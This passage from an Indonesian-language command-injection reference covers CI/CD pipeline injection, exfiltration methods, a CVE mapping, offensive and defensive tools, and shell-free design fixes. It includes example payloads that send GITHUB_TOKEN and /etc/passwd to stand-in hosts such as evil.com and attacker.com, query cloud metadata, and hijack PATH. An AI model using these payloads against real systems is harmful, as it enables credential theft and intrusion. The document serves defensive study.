Permukaan serangan yang berkembang pesat di mana command injection terjadi bukan dalam input aplikasi web tradisional tetapi dalam definisi build/deploy pipeline, file konfigurasi, dan automation workflow.

### §9-1. GitHub Actions Expression Injection

| Subtype | Mekanisme | Kondisi | Contoh |
|---|---|---|---|
| **Direct expression interpolation** | `${{ github.event.issue.title }}` dalam step `run:` langsung disubstitusi ke shell command sebelum eksekusi. Issue/PR title yang dikontrol attacker menyuntikkan perintah arbitrer. | Workflow menggunakan `${{ }}` dalam block `run:` dengan konteks untrusted | Issue title: `"; curl evil.com/steal?token=$GITHUB_TOKEN #` |
| **GITHUB_ENV injection** | Menulis ke `$GITHUB_ENV` mengatur environment variable untuk step selanjutnya. Jika attacker mengontrol input yang menulis ke file ini, mereka menyuntikkan env var arbitrer termasuk `PATH` atau variable yang dikonsumsi script. | Workflow menulis input untrusted ke `$GITHUB_ENV` | `echo "PATH=/tmp/evil:$PATH" >> $GITHUB_ENV` |
| **Composite action injection** | Third-party Actions yang secara internal menggunakan `${{ inputs.* }}` dalam shell command tanpa quoting mempropagasi injeksi dari caller workflow | Menggunakan Actions untrusted dengan input yang dikontrol pengguna | Malicious input via Action parameter |

### §9-2. General CI/CD Injection Patterns

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Jenkinsfile injection** | Jenkins | Pipeline script (`Jenkinsfile`) yang menggunakan string interpolation dalam step `sh` dengan parameter yang dikontrol pengguna (branch names, build parameters, commit messages) | `sh "git checkout ${params.BRANCH}"` dengan branch name `; whoami` |
| **GitLab CI variable injection** | GitLab | Variable dari merge request metadata (title, description) digunakan dalam script blocks | `script: echo "${CI_MERGE_REQUEST_TITLE}"` |
| **Makefile injection** | Any | Build target yang menggunakan `$(shell ...)` atau backtick substitution dengan input yang dikontrol pengguna (filenames, env vars) | Filename containing `$(shell whoami)` |
| **Docker build-arg injection** | Docker | Nilai `ARG` digunakan dalam command `RUN` tanpa quoting | `docker build --build-arg CMD="&& whoami"` |

### §9-3. Supply Chain Command Injection

| Subtype | Mekanisme | Dampak |
|---|---|---|
| **Malicious package install scripts** | npm `postinstall`, pip `setup.py`, Ruby gem extension mengeksekusi perintah arbitrer selama instalasi package | Developer machine atau CI runner compromise |
| **Git hook injection** | Script `.git/hooks/` yang malicious mengeksekusi pada clone, commit, atau push operation | Persistent backdoor level repository |
| **Dependency confusion** | Nama package internal diklaim pada public registry dengan command injection dalam install scripts | Automated CI systems menginstal malicious package |

---

## §10. Attack Scenario Mapping (Sumbu 3)

Bagian ini memetakan teknik injeksi ke skenario eksploitasi berdasarkan kemampuan eksfiltrasi data dan konteks arsitektural.

### §10-1. By Exfiltration Method

| Skenario | Mekanisme | Teknik yang Diperlukan | Kesulitan |
|---|---|---|---|
| **Result-based (direct output)** | Output perintah muncul dalam HTTP response | §1 + separator apa pun; output digabungkan ke response | Rendah |
| **Error-based** | Output perintah muncul dalam error message | §1 + trigger application error yang mengandung output | Rendah–Sedang |
| **Blind time-based** | Infer hasil character-by-character via response delay | §1 + kondisional: `if [ $(whoami\|cut -c 1) = r ]; then sleep 5; fi` | Sedang |
| **Blind file-based** | Menulis output ke file yang dapat diakses web, kemudian retrieve via HTTP | §1 + `> /var/www/html/output.txt`; retrieve via browser | Sedang |
| **Out-of-band DNS** | Eksfiltrasi data sebagai DNS subdomain queries | §1 + `` nslookup `whoami`.attacker.com `` atau `$(whoami).evil.com` | Sedang |
| **Out-of-band HTTP** | Eksfiltrasi data via HTTP request ke server attacker | §1 + `curl http://evil.com/?d= $(cat /etc/passwd\|base64)` | Sedang |
| **Argument injection (no metacharacters)** | Mengeksploitasi flag spesifik binary tanpa shell operator | §2 only; tidak perlu separator | Bervariasi |

### §10-2. By Architectural Context

| Skenario | Arsitektur | Vector Utama | Jalur Eskalasi |
|---|---|---|---|
| **Web application RCE** | Web app PHP/Python/Node.js/Ruby dengan shell call | §1, §3, §6, §7 | Web shell → lateral movement |
| **Network device compromise** | Router/firewall/switch CLI interface | §1, §3 (sering shell terbatas) | Device takeover → network pivot |
| **Container escape** | Aplikasi dalam Docker/K8s pod | §1, §5, §7 | Pod RCE → node compromise via mounted socket/service account |
| **Cloud metadata theft** | Aplikasi dengan SSRF chaining ke command injection | §1 → SSRF (§7-4) atau §1 + `curl 169.254.169.254` | IAM credential theft → cloud account takeover |
| **CI/CD pipeline compromise** | GitHub Actions / Jenkins / GitLab CI | §9 | Secret exfiltration → supply chain poisoning |
| **IoT/embedded device** | Firmware web interface, UART/serial | §1, §6 (shell tool terbatas) | Device takeover → botnet enrollment |
| **Desktop application** | Electron app, CLI tool yang memroses input untrusted | §1, §2, §7 | User-level code execution → privilege escalation |

---

## §11. CVE / Bounty Mapping (2023–2025)

| Kombinasi Mutasi | CVE / Kasus | Produk | Dampak / Bounty |
|---|---|---|---|
| §7-2 (PHP-CGI Unicode bypass) | CVE-2024-4577 | PHP (CGI mode, Windows) | Critical RCE. Unicode "Best-Fit" mapping melewati filtering `-`. Aktif dieksploitasi di wild. |
| §1-1 + §7-1 (semicolon + shell_exec) | CVE-2024-3400 | Palo Alto Networks PAN-OS | Critical RCE. Unauthenticated command injection dalam GlobalProtect gateway. CVSS 10.0. |
| §1 + §7-1 (CLI injection) | CVE-2024-20399 | Cisco NX-OS | Authenticated admin → root command execution via CLI. Dieksploitasi oleh Velvet Ant (Chinese APT). |
| §1 + §7-1 (CLI injection) | CVE-2024-21887 | Ivanti Connect Secure | Unauthenticated RCE via web component. Dichain dengan auth bypass CVE-2023-46805. |
| §2-1 (Git argument injection) | CVE-2025-53652 | Jenkins Git Parameter Plugin | RCE via nilai git parameter yang tidak divalidasi diteruskan ke shell command. 1,500+ server terexpose. |
| §2-1 (go-getter arg injection) | CVE-2024-3817 | HashiCorp go-getter | Argument injection ketika fetching remote default git branches. |
| §9-1 (GH Actions expression) | CVE-2025-53104 | gluestack-ui | CVSS 9.1. RCE via crafted GitHub Discussion title dalam Actions workflow. |
| §1 + §7-1 (proc_open) | CVE-2025-49141 | HaxCMS-PHP | URL input diteruskan ke `proc_open` via `git set_remote` tanpa sanitization. |
| §8-3 (WAF parsing discrepancy) | WAFFLED (ACSAC 2025) | AWS/Azure/Cloudflare/Cloud Armor/ModSecurity | 1,207 bypass via request structure mutation. Google Cloud Armor: Tier 1, Priority 1, Severity 1. |
| §2-1 (argument injection) | CloudImposer (BH 2024) | Google Cloud Platform | GCP command argument injection mempengaruhi jutaan cloud server, termasuk produksi Google. |
| §1 + §7-1 (FortiSIEM CLI) | FG-IR-25-152 | Fortinet FortiSIEM | Unauthenticated OS command injection via crafted CLI requests. Exploit code ditemukan di wild. |
| §9-3 (supply chain) | tj-actions/changed-files (Mar 2025) | GitHub Actions ecosystem | Maintainer account compromise → backdoor dalam semua versi → shell payload dalam consumer workflows. |
| §1-4 + §8-1 (config injection) | CVE-2025-1974 (IngressNightmare) | Kubernetes ingress-nginx | Unauthenticated RCE → cluster-wide secret access → full cluster takeover. |
| §2-1 (argument injection dalam AI agents) | Multiple (2025) | AI coding agents (MCP-based) | Argument injection dalam AI tool-calling flow memungkinkan arbitrary code execution pada developer machine. |
| §1 + §7-1 (glob CLI exec) | CVE-2025-64756 | glob CLI (npm) | Command injection via flag `--cmd` ketika memroses file dengan nama malicious. |
| §7-5 (BatBadBut Windows escaping bypass) | CVE-2024-24576 / CERT VU#123335 | Rust std, Node.js, PHP, Haskell + others | Critical RCE (CVSS 10.0). Array-based "safe" API memanggil cmd.exe untuk .bat/.cmd, mengalahkan argument escaping berbasis backslash. |
| §1 + §7-1 (cloud infrastructure CLI) | CVE-2024-50603 | Aviatrix Controller | Unauthenticated RCE via injeksi parameter `cloud_type` dalam cloud gateway management API. CVSS 10.0. Aktif dieksploitasi di wild. |
| §7-1 (format string → GOT overwrite) | CVE-2019-1579 (silently patched) | Palo Alto GlobalProtect SSL VPN | Pre-auth RCE via format string dalam daemon `sslmgr`. Parameter `scep-profile-name` diteruskan langsung ke `snprintf` sebagai format string. Deteksi time-based via `%9999999c` (delay non-destruktif). Eksploitasi: `%n` menimpa `strlen@GOT` → `system@PLT`, mengkonversi `strlen(input)` selanjutnya menjadi `system(input)` |
| §1-1 + §7-1 (DSSAFE.pm bypass) | CVE-2019-11539 | Pulse Secure Connect VPN | Post-auth command injection melewati hook `DSSAFE.pm` (yang mengintersep `system()`, `open()`, backticks). Bypass: menggunakan flag `-r` tcpdump untuk menghasilkan error message `tcpdump: [payload]: No such file or directory` — Perl menginterpretasikan `tcpdump:` sebagai GOTO label dan mengevaluasi sisanya sebagai code |

---

## §12. Detection Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Commix** (Python) | Semua tipe OS command injection | Deteksi dan eksploitasi otomatis: result-based, blind time-based, file-based, DNS/HTTP out-of-band. Mendukung multiple separator, encoding, dan teknik evasion. |
| **SHELLING** (Burp Extension, PortSwigger) | Comprehensive payload generation | Generator payload OS command injection yang mencakup semua tipe separator, encoding, dan varian OS. |
| **Argument Injection Hammer** (Burp Extension, NCC Group) | Argument injection (§2) secara spesifik | Mengidentifikasi kerentanan argument injection dengan menguji payload leading-dash terhadap binary umum. |
| **Bashfuscator** (Python) | Linux bash payload obfuscation | Obfuscation command otomatis menggunakan variable expansion, encoding, string manipulation, dan eval chains. |
| **DOSfuscation** (PowerShell) | Windows cmd/PowerShell obfuscation | Obfuscation otomatis untuk payload command-line Windows menggunakan environment variable, carets, string operations. |
| **WAFFLED Fuzzer** (Python) | WAF bypass via request mutation | HTTP request fuzzer berbasis grammar yang menargetkan parsing discrepancy antara WAF dan backend framework. |
| **Interactsh** (Go, ProjectDiscovery) | Out-of-band detection infrastructure | Menghasilkan callback URL/DNS subdomain unik untuk mendeteksi blind command injection via channel OOB. |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Semgrep** | Static analysis (multi-language) | Deteksi berbasis pattern dari pemanggilan fungsi berbahaya dengan tainted user input. Rules untuk `exec`, `system`, `subprocess`, `child_process`, dll. |
| **CodeQL** | Static analysis (multi-language) | Taint tracking dari source (user input) ke sink (command execution) di seluruh function boundary. |
| **Snyk Code** | Static analysis (multi-language) | Scanning code real-time untuk sink command injection dengan integrasi IDE. |
| **ModSecurity + CRS** | WAF (runtime) | Request pattern matching dengan Core Rule Set. Mencakup signature command injection umum tetapi rentan terhadap bypass §6 dan §8. |
| **Cloudflare WAF** | WAF (runtime) | Deteksi berbasis ML dan signature. Terus diperbarui tetapi di-bypass oleh teknik §8-3. |

---

## §13. Summary: Core Principles

**Root cause dari semua command injection adalah tidak adanya principled boundary antara data dan instruksi dalam interpreter shell.** Berbeda dengan SQL (yang memiliki parameterized queries) atau HTML (yang memiliki context-aware output encoding), operating system shell dirancang untuk penggunaan interaktif manusia di mana pengguna *adalah* otoritas. Setiap fitur yang membuat shell powerful untuk manusia—metacharacter, expansion, globbing, quoting, environment variable—menjadi permukaan serangan ketika data untrusted memasuki pipeline interpretasi shell.

**Incremental fixes gagal karena permukaan mutasi adalah combinatorially explosive.** Pendekatan blocklist harus memperhitungkan setiap command separator (§1: `;`, `&&`, `||`, `|`, `&`, `\n`), setiap sintaks substitution (§1-4: `` ` ` ``, `$()`, `$(())`), setiap mekanisme shell expansion (§4: braces, globs, tildes, process substitution), setiap transformasi encoding (§6: hex, octal, base64, URL, Unicode, quote insertion, case manipulation, ekstraksi substring variable), dan setiap API berbahaya spesifik bahasa (§7). Setiap teknik dapat dikombinasikan dengan yang lain, dan shell baru (zsh, fish, PowerShell) memperkenalkan sintaks tambahan. WAF atau input filter perlu mereplikasi shell parser sepenuhnya untuk mendeteksi semua injeksi secara andal—pada titik itu akan lebih sederhana untuk tidak memanggil shell sama sekali.

**Solusi struktural adalah menghilangkan shell dari path eksekusi perintah.** Ini berarti menggunakan API array-based yang meneruskan argument langsung ke `execvp()` tanpa interpolasi shell (`execFile` di Node.js, `subprocess.Popen([...])` dengan `shell=False` di Python, multi-argument `system()` di Ruby/Perl, `ProcessBuilder` di Java). Pendekatan ini menghilangkan seluruh ruang mutasi §1, §3, §4, §5, §6, dan §8, mengurangi risiko residual ke argument injection (§2) saja—yang diatasi dengan memasukkan `--` sebelum argument yang dikontrol pengguna dan memvalidasi bahwa input tidak dimulai dengan `-`. Pengecualian kritis ada di Windows: ketika target executable adalah file `.bat` atau `.cmd`, Windows secara diam-diam memanggil `cmd.exe`, memperkenalkan kembali interpretasi shell meskipun menggunakan API array-based (§7-5, BatBadBut). Untuk konteks CI/CD (§9), fix struktural adalah tidak pernah menginterpolasi input untrusted ke shell command: gunakan intermediate environment variable (`env:` di GitHub Actions) atau API purpose-built sebagai gantinya.

CISA dan FBI dalam joint advisory 2024 secara eksplisit menyerukan kepada technology manufacturer untuk menghilangkan OS command injection di level design daripada mengandalkan input sanitization—pengakuan bahwa kelas kerentanan ini secara fundamental adalah *design problem*, bukan *input validation problem*.

---

## References

- CISA. "Secure by Design Alert: Eliminating OS Command Injection Vulnerabilities." July 2024. https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-os-command-injection-vulnerabilities 
- MITRE. "CWE-78: Improper Neutralization of Special Elements used in an OS Command." https://cwe.mitre.org/data/definitions/78.html 
- MITRE. "CWE-77: Improper Neutralization of Special Elements used in a Command." https://cwe.mitre.org/data/definitions/77.html 
- SwissKyRepo. "PayloadsAllTheThings: Command Injection." https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection 
- SonarSource. "Argument Injection Vectors." https://sonarsource.github.io/argument-injection-vectors/ 
- HackTricks. "Command Injection." https://book.hacktricks.wiki/pentesting-web/command-injection.html 
- Akhavani et al. "WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls." ACSAC 2025. https://arxiv.org/abs/2503.10846 
- Stasinopoulos et al. "Commix: automating evaluation and exploitation of command injection vulnerabilities." International Journal of Information Security, 2018.
- NCC Group. "Argument Injection Hammer." https://github.com/nccgroup/argumentinjectionhammer 
- PortSwigger. "SHELLING - OS Command Injection Payload Generator." https://github.com/PortSwigger/command-injection-attacker 
- Snyk. "Rediscovering argument injection when using VCS tools." https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/ 
- F5 DevCentral. "WAF Evasion Techniques for Command Injection." https://community.f5.com/kb/technicalarticles/waf-evasion-techniques-for-command-injection/331312 
- Aikido Security. "Command Injection in 2024 Report." https://www.aikido.dev/blog/command-injection-in-2024-unpacked 
- OWASP. "OS Command Injection Defense Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html 
- Flatt Security. "BatBadBut: You can't securely execute commands on Windows." April 2024. https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/ 
- CERT/CC. "VU#123335: Multiple programming languages fail to escape arguments properly when invoking programs on Windows." April 2024. https://kb.cert.org/vuls/id/123335 

---

*Dokumen ini dibuat untuk tujuan defensive security research dan vulnerability understanding.*